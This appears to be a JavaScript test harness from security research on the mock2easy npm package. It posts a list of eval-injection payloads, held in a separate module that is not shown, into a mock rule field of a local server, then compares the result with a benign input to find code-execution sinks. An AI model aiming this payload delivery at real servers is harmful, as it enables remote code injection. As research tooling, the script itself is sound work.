/**
 * This test need to start mongod before
 */
var utils = require("iflow");
var attackUtils = require("./AttackUtils.js");
attackUtils.setup();

// var configs = require("./configs.json");
// var policy = require("./Policy.js")(__dirname, null, require("./node_modules/mock2easy/node_modules/express"));

var request = require('request');

var mock2easy = require("mock2easy")("x","a", function(app) {
    app.listen(3000, function () {
        attackUtils.deliverPayloads(attackUtils.payloadsEval, function (payload) {
            request({
                url:'http://localhost:3000/modify',
                method: "POST",
                json: true,
                body: JSON.parse("{\"interfaceUrl\":\"/http\",\"requiredParameters\":[], \"responseParameters\":[{\"kind\":\"mock\",\"rule\":\"" + payload + "\"}]}")
            }, function(error, response, body) {
                // console.log(body);
            });
        }, function(result, filesWithSinks) {
            var benignInput = "{obj: 23}"
            request({
                url:'http://localhost:3000/modify',
                method: "POST",
                json: true,
                body: JSON.parse("{\"interfaceUrl\":\"/http\",\"requiredParameters\":[], \"responseParameters\":[{\"kind\":\"mock\",\"rule\":\"" + benignInput + "\"}]}")
            }, function(error, response, body) {
                attackUtils.printCallStrings();
                result += " " + attackUtils.observedString(benignInput);
            attackUtils.deleteFolderRecursive("./mock2easy");
                // console.log(body);
                setTimeout(function() {
                    process.exit(0);
                }, 2000)

            });
        });
    });
});

